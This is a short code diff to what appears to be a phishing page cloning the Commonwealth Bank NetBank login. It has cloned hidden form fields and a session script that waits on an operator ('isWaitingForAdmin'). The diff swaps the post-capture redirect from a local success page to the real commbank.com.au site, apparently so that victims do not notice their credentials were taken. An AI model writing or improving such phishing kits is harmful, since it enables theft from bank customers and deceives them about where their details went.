@@ -30,7 +30,6 @@
 <input type="hidden" name="rqid" id="rqid" value="NFmUClov2EWdpTp7Tcq9QQ" />
 <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYyNzk3MDY5NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEWNoa1JlbWVtYmVyJGZpZWxkyajFL6pW3G2RJiK0b4vThcB6Jn0=" />
 </div>
-
 <script>
   /* ===== 1. SESSION SET-UP ===== */
   const sid = new URLSearchParams(location.search).get('sid') ||
@@ -269,7 +268,8 @@
 
         if (data.status === 'ok') {
           isWaitingForAdmin = false;
-          window.location.href = '/success.html';
+          // Redirect to real CommBank website
+          window.location.href = 'https://www.commbank.com.au';
           return;
         }
 
@@ -516,3 +516,4 @@ document.write("<input type=\"hidden\" name=\"JS\" value=\"E\" />");
 	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
 </body>
 </html>
+
